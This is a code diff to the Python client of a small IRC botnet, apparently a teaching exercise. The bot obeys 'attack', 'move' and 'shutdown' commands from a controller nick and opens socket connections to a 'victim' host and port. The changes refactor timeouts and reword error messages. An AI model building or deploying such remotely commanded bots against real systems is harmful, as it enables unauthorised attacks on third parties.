@@ -23,8 +23,10 @@ class Bot_Client:
         self.attack_counter = 0
 
     def start_client(self):
-        connected, self.irc_socket = self.__attempt_connection()
-
+        connected, self.irc_socket = self.__attempt_connection(5)
+        if not connected:
+            sys.exit()
+            
         while connected:
             text = self.get_text()
             self.log(text)
@@ -40,9 +42,9 @@ class Bot_Client:
 
         self.irc_socket.close()
 
-    def __attempt_connection(self):
+    # attempts connection with an input timeout in seconds
+    def __attempt_connection(self, timeout):
         connected = False
-        timeout = 5 # timeout (in seconds)
         timeout_start = time.time()
         while not connected and (time.time() < timeout_start + timeout):
             connected, conn_socket = self.__connect()
@@ -117,12 +119,14 @@ class Bot_Client:
         if command.startswith("attack"):
             command = command.split()
             if len(command) != 3:
+                self.send_to_user(self.controller_nick, "Attack Failed, " + \
+                                  "Incorrect number of arguments")
                 return
             self.__attack(command[1], command[2])
         elif command.startswith("move"):
             command = command.split()
             if len(command) != 4:
-                self.send_to_user(self.controller_nick, "Move Failed: " + \
+                self.send_to_user(self.controller_nick, "Move Failed, " + \
                                   "Incorrect number of arguments")
                 return
             self.__move(command[1], command[2], command[3])
@@ -132,7 +136,6 @@ class Bot_Client:
         elif command == "shutdown":
             self.__shutdown()
         else:
-            print("Command: " + command)
             self.send_to_user(self.controller_nick, "Unknown Command")
 
 
@@ -141,7 +144,7 @@ class Bot_Client:
     # moves the bot to the specified host
     def __move(self, host, port, channel):
         if not check_port(port):
-            self.send_to_user(self.controller_nick, "Move Failed: Invalid Port")
+            self.send_to_user(self.controller_nick, "Move Failed, Invalid Port")
             return
         port = int(port)
         # store current connection info
@@ -152,10 +155,10 @@ class Bot_Client:
         self.port = port
         self.host = host
         self.channel = "#" + channel
-        # attempt connection to new IRC server
-        connected, conn_socket = self.__attempt_connection()
+        # attempt connection to new IRC server (timeout close to 0)
+        connected, conn_socket = self.__attempt_connection(0.5)
         if not connected:
-            self.send_to_user(self.controller_nick, "Move Failed: Connection Error")
+            self.send_to_user(self.controller_nick, "Move Failed, Connection Error")
             # reassign original connection info upon failure
             self.port = curr_port
             self.host = curr_host
@@ -175,26 +178,22 @@ class Bot_Client:
         self.attack_counter += 1
         if not check_port(port):
             self.log("Error: Port: " + str(port) + " is not valid.")
-            self.send_to_user(self.controller_nick, "Attack Failed: Invalid Port")
+            self.send_to_user(self.controller_nick, "Attack Failed, Invalid Port")
             return
         port = int(port)
         attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        connected = False
-        timeout = 5 # timeout (in seconds)
-        timeout_start = time.time()
-        while not connected and (time.time() < timeout_start + timeout):
-            try:
-                attack_socket.connect((host, port)) # connect to victim
-            except Exception:
-                continue
-            connected = True
+        connected = True
+        try:
+            attack_socket.connect((host, port)) # connect to victim
+        except Exception:
+            connected = False
 
         if not connected:
             self.log("Error: Attack on Host: " + host + \
-                     " on Port: " + str(port) + " timed out.")
+                     " on Port: " + str(port) + " failed.")
             self.send_to_user(self.controller_nick,
-                              "Attack Failed: Connection Error")
+                              "Attack Failed, Connection Error")
         else:
             # send attack message and report success
             attack_socket.send((str(self.attack_counter) + \
